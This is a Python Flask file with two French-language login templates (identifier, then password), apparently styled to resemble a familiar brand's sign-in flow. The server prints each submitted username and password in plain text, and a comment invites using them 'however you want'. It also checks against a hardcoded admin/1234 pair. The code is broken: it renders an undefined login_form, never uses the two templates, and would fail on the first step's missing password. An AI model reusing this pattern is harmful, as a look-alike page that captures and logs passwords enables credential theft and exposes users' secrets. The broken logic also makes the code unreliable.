from flask import Flask, request, render_template_string

app = Flask(__name__)

step1_form = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion - Étape 1</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fff;
        }
        .container {
            width: 90%;
            max-width: 400px;
        }
        .input-box {
            display: flex;
            border: 1px solid #ccc;
            border-radius: 24px;
            overflow: hidden;
        }
        input[type="text"] {
            flex: 1;
            border: none;
            padding: 16px;
            font-size: 16px;
            outline: none;
        }
        button {
            background-color: transparent;
            border: none;
            padding: 0 20px;
            cursor: pointer;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="container">
        <form method="POST">
            <div class="input-box">
                <input type="text" name="username" placeholder="Courriel ou numéro de téléphone" required>
                <button type="submit">→</button>
            </div>
        </form>
    </div>
</body>
</html>
"""

step2_form = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion - Étape 2</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fff;
        }
        .container {
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        h3 {
            margin-bottom: 20px;
        }
        input[type="password"] {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border-radius: 8px;
            border: 1px solid #ccc;
            margin-bottom: 20px;
        }
        button {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            background-color: #0071e3;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h3>{{ username }}</h3>
        <form method="POST">
            <input type="hidden" name="username" value="{{ username }}">
            <input type="password" name="password" placeholder="Mot de passe" required><br>
            <button type="submit">Se connecter</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        # RÉCUPÉRATION CÔTÉ SERVEUR
        username = request.form["username"]
        password = request.form["password"]

        # Tu peux maintenant utiliser ces valeurs comme tu veux :
        print(f"Nom d'utilisateur reçu : {username}")
        print(f"Mot de passe reçu : {password}")

        # Par exemple, vérification basique :
        if username == "admin" and password == "1234":
            return f"<h3>Bienvenue, {username} !</h3>"
        else:
            return "<h3>Identifiants incorrects</h3>"

    return render_template_string(login_form)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
